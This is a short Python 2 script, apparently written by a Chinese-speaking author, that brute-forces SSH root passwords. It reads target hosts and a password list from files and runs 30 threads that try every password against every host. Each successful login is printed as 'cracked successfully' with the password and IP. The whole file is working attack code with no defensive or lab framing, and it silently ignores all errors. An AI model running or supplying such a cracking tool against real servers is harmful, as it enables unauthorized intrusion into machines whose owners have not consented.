#coding:utf-8
import threading
import Queue
import paramiko
import socket
import os
 
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
host_file = BASE_DIR + '\dict\hosts.txt'
pass_file = BASE_DIR + '\dict\pass.txt'
paramiko.util.log_to_file("filename.log")
queue = Queue.Queue()
lock = threading.Lock()
def read_host_file(path):
    hostlist = []
    with open(path,'r') as f:
        for line in f.readlines():
            if line == '':
                continue
            line = socket.gethostbyname(line.strip())
            hostlist.append(line)
        return hostlist
def read_pass_file(path):
    passlist = []
    with open(path,'r') as f:
        for line in f.readlines():
            if line == '':
                continue
            passlist.append(line.strip())
        return passlist
class SSH(threading.Thread):
    """docstring for SSH"""
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:
            # if self.queue.empty():
            #   break
            host,pwd = self.queue.get()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 
                ssh.connect(hostname=host,port=22,username='root',password=pwd,timeout=5)
                ssh.close()
                print('破解成功!用户名:root'  + '密码:' + pwd + ',ip:' + host)
 
            except paramiko.AuthenticationException as e:
                pass
            except socket.error as e:
                pass
            except:
                pass
            self.queue.task_done()
 
if __name__ == '__main__':
    hosts = read_host_file(host_file)
    passlist = read_pass_file(pass_file)
    for i in range(30):
        fuck_ssh = SSH(queue)
        fuck_ssh.setDaemon(True)
        fuck_ssh.start()
    for host in hosts:
        for pwd in passlist:
            queue.put((host,pwd))
    queue.join()